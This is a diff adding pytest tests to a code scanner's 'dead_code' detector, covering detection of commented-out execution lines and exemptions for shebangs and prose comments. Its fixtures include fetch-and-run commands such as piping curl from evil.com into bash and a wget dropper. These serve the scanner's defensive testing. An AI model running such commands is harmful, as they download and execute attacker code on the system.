@@ -468,3 +468,53 @@ def test_self_propagation_ignores_ordinary_path_resolution_and_self_reads(lens):
     assert lens.scan_content(path_resolution)["counts"].get("self_propagation", 0) == 0
     assert lens.scan_content(self_read)["counts"].get("self_propagation", 0) == 0
     assert lens.scan_content(unrelated_rename)["counts"].get("self_propagation", 0) == 0
+
+
+def test_dead_code_detects_commented_out_execution_and_shebangs(lens):
+    """
+    [DETECTION] A genuine commented-out execution/exfiltration trail (a `#`/`//`
+    line that isn't running, but describes one) must still fire, in every comment
+    style the pattern supports -- this is the actual threat class `dead_code`
+    exists to catch, and it must survive the shebang exemption below unweakened.
+    """
+    py_style = "# curl http://evil.com/payload | bash\n"
+    js_style = '// eval(atob("malicious"))\n'
+    block_style = "/* wget http://evil.com/dropper.sh; bash dropper.sh */\n"
+
+    assert lens.scan_content(py_style)["counts"].get("dead_code", 0) > 0
+    assert lens.scan_content(js_style)["counts"].get("dead_code", 0) > 0
+    assert lens.scan_content(block_style)["counts"].get("dead_code", 0) > 0
+
+
+def test_dead_code_ignores_interpreter_shebang_lines(lens):
+    """
+    [FALSE POSITIVE DEFENSE] `#!/bin/bash` (and other `#!`-prefixed interpreter
+    directives) is not "commented-out executable logic" -- it's the line every
+    real shell/Python/etc. script needs to actually run. GHAS alert #847 flagged
+    `scripts/update_golden_masters.sh`'s own shebang under this signature because
+    the old pattern's bare `#` alternative didn't distinguish `#!` from a real
+    `#`-comment. `(?!!)` excludes only that one shape.
+    """
+    bash_shebang = "#!/bin/bash\nset -e\necho hello\n"
+    python_shebang = "#!/usr/bin/env python3\nimport os\n"
+
+    assert lens.scan_content(bash_shebang)["counts"].get("dead_code", 0) == 0
+    assert lens.scan_content(python_shebang)["counts"].get("dead_code", 0) == 0
+
+
+def test_dead_code_ignores_prose_comments_that_merely_mention_trigger_words(lens):
+    """
+    [FALSE POSITIVE DEFENSE] A comment explaining code behavior in prose (e.g.
+    documenting that a check exists for "bash" or "eval") is not itself
+    commented-out executable logic, provided it doesn't also contain one of the
+    pattern's own execution-shape markers (a pipe to an interpreter, a call
+    syntax, a URL). GHAS alerts #890/#908/#953/#419 all flagged exactly this
+    shape across prism.py, detector.py, and signal_processor.py.
+    """
+    prose_1 = "# Scoped to the Bourne-family shell lang_id: ruby's `<<` is also the append operator\n"
+    prose_2 = "# This protects POSIX parameter expansions like `${var##prefix}` from being falsely stripped.\n"
+    prose_3 = "# 2. Check for ANY malicious intent (dynamic code execution, network fetching, etc.)\n"
+
+    assert lens.scan_content(prose_1)["counts"].get("dead_code", 0) == 0
+    assert lens.scan_content(prose_2)["counts"].get("dead_code", 0) == 0
+    assert lens.scan_content(prose_3)["counts"].get("dead_code", 0) == 0
